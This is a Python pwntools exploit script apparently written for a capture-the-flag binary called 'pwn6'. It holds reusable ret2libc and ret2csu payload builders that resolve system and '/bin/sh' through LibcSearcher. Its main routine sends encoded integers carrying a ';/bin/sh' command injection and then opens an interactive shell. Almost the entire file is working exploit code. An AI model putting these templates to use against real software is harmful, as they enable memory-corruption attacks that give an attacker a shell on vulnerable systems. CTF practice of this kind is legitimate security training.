#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *
from sys import argv

local = 1
if 'r' in argv:	local = 0
#libc_path = 'libc.so.6'
os_level = 64
binary_name = 'pwn6'
remote_addr, port = ':'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    #libc = elf.libc
else:
    log.warning('!!REMOTE!!')
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
    if local: libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
    if local: libc_path = 'lib/i386-linux-gnu/libc.so.6'
else:
    print('Error os!!!')
    exit()
#libc = ELF(libc_path)
#context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
leak = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
uu32 = lambda data: u32(data.ljust(4,b'\x00'))
uu64 = lambda data: u64(data.ljust(8,b'\x00'))
slp = lambda x: sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak:int,funcname:bytes,path=''):
    if path == '':
        libc = LibcSearcher(funcname,leak)
        base = leak - libc.dump(funcname)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.sym[funcname]
        system = base + libc.sym['system']
        bin_sh = base + next(libc.search(b'/bin/sh'))

    return (system, bin_sh)
def csu(offset,r12, r13, r14, r15, last,csu_end_addr,csu_front_addr):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdx=r13
    # rsi=r14
    # rdi=edi=r15d
    payload = b'a'*offset + b'b'*0x8
    payload += p64(csu_end_addr) + p64(0) + p64(1) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    return payload

#Main function
if __name__ == '__main__':
    #you can add your code here
    arr = []
    s = "PvvN| 1S S0 GREAT!;/bin/sh".ljust(80,"\x00")
    for i in range(0,len(s),4):
        tmp=hex(ord(s[i+3]))[2:].zfill(2)
        tmp+= hex(ord(s[i + 2]))[2:].zfill(2)
        tmp+= hex(ord(s[i + 1]))[2:].zfill(2)
        tmp+= hex(ord(s[i + 0]))[2:].zfill(2)
        arr.append(int(tmp,16))
    for i in range(len(arr)):
        arr[i]-=0x1BF52
    for i in range(20):
        sl(str(arr[i]))
    p.interactive()